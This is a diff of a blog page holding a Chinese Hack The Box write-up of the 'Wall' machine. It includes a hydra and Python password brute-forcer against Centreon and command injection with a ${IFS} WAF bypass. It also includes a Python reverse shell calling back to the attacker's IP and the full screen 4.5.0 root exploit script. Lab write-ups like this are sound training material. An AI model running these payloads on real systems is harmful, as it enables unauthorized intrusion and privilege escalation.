@@ -1,33 +1,151 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Wall Writeup · Ikonw</title><meta name="description" content="HTB Wall Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
-</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Wall Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a></div><div class="post-info">Jan 13, 2020</div><div class="post-content"><p>这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。<br>作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。</p>
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  HTB Wall Writeup |   Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			HTB Wall Writeup
+		</p>
+		<div class="info">	
+			<time>
+				Jan 13, 2020
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">4371
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+
+			
+					<p>这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。<br>作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。</p>
 <span id="more"></span>
 
 <p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
 <h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p><img src="/images/old-machine-images/20200113103328564.png" alt="a"></p>
 <h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/old-machine-images/20200113141911717.png" alt="a"><br>正常的nmap端口扫描 没有太多信息。 22 SSH 和端口 80 web 服务</p>
 <h2 id="二，网页目录爆破"><a href="#二，网页目录爆破" class="headerlink" title="二，网页目录爆破"></a>二，网页目录爆破</h2><p>我比较喜欢用gobuster，来进行目录爆破。如果没有 请自行安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gobuster</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install gobuster</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
 
 <p>我常用的字典是用 <strong>directory-list-2.3-medium.txt</strong><br>找到目录 <strong>&#x2F;monitoring</strong></p>
 <p><img src="/images/old-machine-images/2020011314234543.png" alt="a"><br>发现有个HTTP基础认证(HTTP Basic Authentication)<br><img src="/images/old-machine-images/20200113142511558.png" alt="a"></p>
 <h2 id="三，对基础认证进行试验"><a href="#三，对基础认证进行试验" class="headerlink" title="三，对基础认证进行试验"></a>三，对基础认证进行试验</h2><p>由于gobuster 没有扫到什么其他目录，于是我把目标放在这基础认证。 首先我尝试是否可以hydra 来进行爆破密码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-get /monitoring -t 30</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-get /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></table></figure>
 
 <p>如何使用hydra 我就不仔细教学了，这里有一篇很好的文章讲解各种hydra 选项<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ECJTUACM-873284962/p/7805116.html">传送门</a></p>
 <p><img src="/images/old-machine-images/20200113142947843.png" alt="a"><br>hydra跑完后 我还是没有拿到密码。于是我把 <strong>http-get</strong> 换成 <strong>http-post</strong> 尝试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P Most-Popular-Letter-Passes.txt 10.10.10.157 http-post /monitoring -t 30</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -l admin -P Most-Popular-Letter-Passes.txt <span class="number">10.10.10.157</span> http-post /monitoring -t <span class="number">30</span></span><br><span class="line"><span class="attribute">1</span></span><br></pre></td></tr></table></figure>
 
 <p>有意思的是居然每一个密码都能通过。<br><img src="/images/old-machine-images/20200113143116714.png" alt="a"><br>现在我们可以尝试使用burp suite更改请求。从GET换去POST。然后我们被跳转到 <strong>&#x2F;centreon</strong></p>
 <p><img src="/images/old-machine-images/20200113160329860.png" alt="a"><br>这里简单的抓包下看 登陆的过程。 有ANTI-CSRF TOKEN所以没办法爆破。我们从登陆页面发现<strong>centreon</strong> 版本为 <strong>v.19.04.0</strong></p>
 <p><img src="/images/old-machine-images/20200113161232966.png" alt="a"><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47069">edb链接</a></p>
 <h2 id="四，修改Exploit"><a href="#四，修改Exploit" class="headerlink" title="四，修改Exploit"></a>四，修改Exploit</h2><p>先来聊聊这个exploit 的 python文件都干了什么。<br>这个exploit 有两个部分，一个是<strong>登陆</strong> 一个是利用了<strong>命令注入</strong></p>
 <p>登陆的部分利用beautiful soup来抓去页面的 token。<br>然后利用提供的API进行登陆。<br>那么有意思的地方就在这里<br>我们是不是可以稍微修改下 让这部分变成密码爆破。<br><img src="/images/old-machine-images/20200113161853332.png" alt="a"><br>这里默认帐号是 <strong>admin</strong> 密码字典为 <strong>rockyou.txt</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import warnings</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">with open(&quot;/usr/share/wordlists/rockyou.txt&quot;,&quot;r&quot;) as dict:</span><br><span class="line">    for password in dict:</span><br><span class="line">        request = requests.session()</span><br><span class="line">        print(&quot;[+] Retrieving CSRF token to submit the login form&quot;)</span><br><span class="line">        page = request.get(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;)</span><br><span class="line">        html_content = page.text</span><br><span class="line">        soup = BeautifulSoup(html_content)</span><br><span class="line">        token = soup.findAll(&#x27;input&#x27;)[3].get(&quot;value&quot;)</span><br><span class="line">        login_info = &#123;</span><br><span class="line">                &quot;useralias&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: password.strip(),</span><br><span class="line">                &quot;submitLogin&quot;: &quot;Connect&quot;,</span><br><span class="line">                &quot;centreon_token&quot;: token</span><br><span class="line">                &#125;</span><br><span class="line">        login_request = request.post(&quot;http://10.10.10.157/centreon&quot;+&quot;/index.php&quot;, login_info)</span><br><span class="line">        print(login_info)</span><br><span class="line">        if &quot;Your credentials are incorrect.&quot; not in login_request.text:</span><br><span class="line">            print(&quot;[+] Crackedddddddddddddddddd password = &#123;0&#125;&quot;.format(password.strip()))</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">12345678910111213141516171819202122232425</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import warnings</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">with <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) as dict:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> dict:</span><br><span class="line">        request = requests<span class="selector-class">.session</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Retrieving CSRF token to submit the login form&quot;</span>)</span><br><span class="line">        page = request<span class="selector-class">.get</span>(<span class="string">&quot;http://10.10.10.157/centreon&quot;</span>+<span class="string">&quot;/index.php&quot;</span>)</span><br><span class="line">        html_content = page<span class="selector-class">.text</span></span><br><span class="line">        soup = <span class="built_in">BeautifulSoup</span>(html_content)</span><br><span class="line">        token = soup<span class="selector-class">.findAll</span>(<span class="string">&#x27;input&#x27;</span>)<span class="selector-attr">[3]</span><span class="selector-class">.get</span>(<span class="string">&quot;value&quot;</span>)</span><br><span class="line">        login_info = &#123;</span><br><span class="line">                <span class="string">&quot;useralias&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: password<span class="selector-class">.strip</span>(),</span><br><span class="line">                <span class="string">&quot;submitLogin&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">                <span class="string">&quot;centreon_token&quot;</span>: token</span><br><span class="line">                &#125;</span><br><span class="line">        login_request = request<span class="selector-class">.post</span>(<span class="string">&quot;http://10.10.10.157/centreon&quot;</span>+<span class="string">&quot;/index.php&quot;</span>, login_info)</span><br><span class="line">        <span class="built_in">print</span>(login_info)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your credentials are incorrect.&quot;</span> not <span class="keyword">in</span> login_request<span class="selector-class">.text</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Crackedddddddddddddddddd password = &#123;0&#125;&quot;</span><span class="selector-class">.format</span>(password<span class="selector-class">.strip</span>()))</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425</span></span><br></pre></td></tr></table></figure>
 
 <p>执行后大约过了十几秒 我们成功取得密码（这密码也太弱了）<br><strong>admin:password1</strong></p>
 <p><img src="/images/old-machine-images/20200113162428647.png" alt="a"></p>
 <h2 id="五，绕过WAF"><a href="#五，绕过WAF" class="headerlink" title="五，绕过WAF"></a>五，绕过WAF</h2><p>现在我们有了密码和帐号，我可以来实验看看原版的POC能不能让我们直接取得Shell。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python 47069.py http://10.10.10.157/centreon admin password1 10.10.14.22 443</span><br><span class="line">nc -nvlp 443</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> <span class="number">47069</span>.py http://<span class="number">10.10.10.157</span>/centreon admin password1 <span class="number">10.10.14.22</span> <span class="number">443</span></span><br><span class="line"><span class="attribute">nc</span> -nvlp <span class="number">443</span></span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/old-machine-images/20200113162741683.png" alt="a"><br>一点动静都没有！没事 让我们仔细读读第二个部分的命令注入 我们可以手动注入命令！</p>
 <p>从exploit 上可以得知 <strong>nagios_bin</strong> 这选项可以让我们直接执行远程命令</p>
@@ -35,27 +153,27 @@
 <p><a target="_blank" rel="noopener" href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">传送门</a><br><img src="/images/old-machine-images/20200113162949567.png" alt="a"><br>访问URL后并且用burp suite抓包 然后 <strong>ctrl+r</strong> 发去repeater<br>手动进行更换 一般遇上可以远程执行命令的问题时<br>可以尝试用ping wget curl 来判断是否可以远程执行。<br>因为这些命令都会与本地进行交互 并且可以查询到记录。</p>
 <p><img src="/images/old-machine-images/20200113163833292.png" alt="a"></p>
 <p>首先 先测试能不能ping<br>nagios_bin&#x3D;ping+10.10.14.12(自己KALI的IP)<br>然后在本地上开启tcpdump来监听ICMP<br>用 -i 来选择监听的interface</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i tun0 icmp</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">i</span> tun0 icmp</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/old-machine-images/20200113164236597.png" alt="a"><br>搭建好环境后 选择send，结果却是forbidden 403。无法访问，这里就是“墙” 出现的地方了。</p>
 <p><img src="/images/old-machine-images/20200113164327348.png" alt="a"><br>这时候我们可以手动到页面进行测试，从a~z 然后各种符号。<br>最终发现任何字母都没问题，除了 空格会触发 403 forbidden。<br>我们可以用 <strong>${IFS}</strong> 来代替空格。</p>
 <p><img src="/images/old-machine-images/20200113165157271.png" alt="a"><br>结果tcpdump 还是没有任何结果。没关系，为了更进一步实验 我们可以尝试 wget。<br>打开一个web 服务（可以使用service apache2 start 或者 python3 -m http.server 80）</p>
 <p><strong>“nagios_bin”: “wget${IFS}10.10.14.12”</strong></p>
 <p>我们成功从发现了 log 里面返回了 wall 向本地抓去index.php<br>证实了 命令注入可以<br><img src="/images/old-machine-images/20200113165336273.png" alt="a"><br>经过一番折腾， 上传了各种php,bash shell。只有python shell可以使用<br>上传后，利用python 执行 python shell文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;10.10.14.12&quot;,443)) //替换这里成你的ip和端口</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"></span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">s=socket<span class="selector-class">.socket</span>(socket<span class="selector-class">.AF_INET</span>,socket.SOCK_STREAM)</span><br><span class="line">s<span class="selector-class">.connect</span>((<span class="string">&quot;10.10.14.12&quot;</span>,<span class="number">443</span>)) <span class="comment">//替换这里成你的ip和端口</span></span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">0</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">1</span>)</span><br><span class="line">os<span class="selector-class">.dup2</span>(s<span class="selector-class">.fileno</span>(),<span class="number">2</span>)</span><br><span class="line">import pty</span><br><span class="line">pty<span class="selector-class">.spawn</span>(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/old-machine-images/20200113165830186.png" alt="a"></p>
 <h2 id="六，提权"><a href="#六，提权" class="headerlink" title="六，提权"></a>六，提权</h2><p>提权相对容易发现。<br>首先查看 SUID文件。<br>发现可疑的 <strong>screen-4.5.0</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/old-machine-images/20200113170008960.png" alt="a"><br>谷歌一下 发现了提权漏洞</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41154">传送门</a></p>
 <p>个人习惯看到这种需要编译的漏洞都喜欢在本地编译好了再传输过去。直接执行这文件会出现未知错误。保险起见 我们手动把操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!/n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;/x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!/n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;/x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536</span><br></pre></td></tr></table></figure>
 
 <p>手动操作好后 会出现两个文件<br><img src="/images/old-machine-images/20200113170701936.png" alt="a"></p>
 <p>利用wget 传输到 &#x2F;tmp<br>然后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;/x0a/tmp/libhax.so&quot;</span><br><span class="line">然后执行 /tmp/rootshell</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;/x0a/tmp/libhax.so&quot;</span></span><br><span class="line">然后执行 /tmp/rootshell</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/old-machine-images/20200113171057750.png" alt="a"></p>
 <br/>
@@ -63,4 +181,196 @@
 <br/>
 
 <p><img src="/images/root.gif" alt="root"></p>
-</div></article></div></main><footer><div class="paginator"><a href="/2020/01/22/HTB-jarvis/" class="prev">PREV</a><a href="/2020/01/10/HTB-bastion/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
+  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+      <i class="iconfont icon-category"></i>
+      <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+
+      
+
+      
+      <i class="iconfont icon-tag"></i>
+      <a class="tag-none-link" href="/tags/hackthebox/" rel="tag">hackthebox</a>
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"
+		></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" 
+src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+      <a href="/2020/01/10/HTB-bastion/" class="link-wrap">
+        <strong class="caption">older</strong>
+        
+        <span class="title">
+          HTB Bastion Writeup
+        </span>
+      </a>
+      
+    </div>
+    <div class="link">
+      
+      <a href="/2020/01/22/HTB-jarvis/" class="link-wrap">
+        <strong class="caption">newer</strong>
+        
+        <span class="title">
+          HTB Jarvis Writeup
+        </span>
+      </a>
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+
